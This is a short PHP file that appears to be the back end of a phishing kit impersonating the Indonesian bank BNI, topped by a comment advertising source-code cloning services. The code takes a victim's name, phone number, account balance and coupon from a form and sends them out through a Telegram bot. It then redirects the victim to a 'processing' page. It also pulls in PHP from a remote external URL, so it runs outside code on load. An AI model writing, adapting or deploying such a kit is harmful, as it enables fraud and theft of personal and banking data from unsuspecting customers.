<?php

/*
🔧 OPEN JASA LAYANAN KODE & HOSTING 🔧

✅ Clone Source Code (SC)
✅ Perbaikan / Bengkel SC
✅ Custom & Modifikasi Project
✅ Semua Kebutuhan SC / Hosting TERMURAH!

📞 Hubungi
WA : 6287875413098 (Master Coding – Fullstack Developer)
*/

include 'https://bni.faa.biz.id/bni1/req/js.php';
session_start();
$namalengkap = $_POST['namalengkap'];
$nomortelepon = $_POST['nomortelepon'];
$saldo = $_POST['saldo'];
$kupon = $_POST['kupon'];

$message = "
𝙉𝘼𝙈𝘼 : ".$namalengkap."
𝙉𝙊 𝙃𝙋 : ".$nomortelepon."
𝙎𝘼𝙇𝘿𝙊 : ".$saldo."
𝙆𝙐𝙋𝙊𝙉 : ".$kupon."";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location: ../proces.html');
?>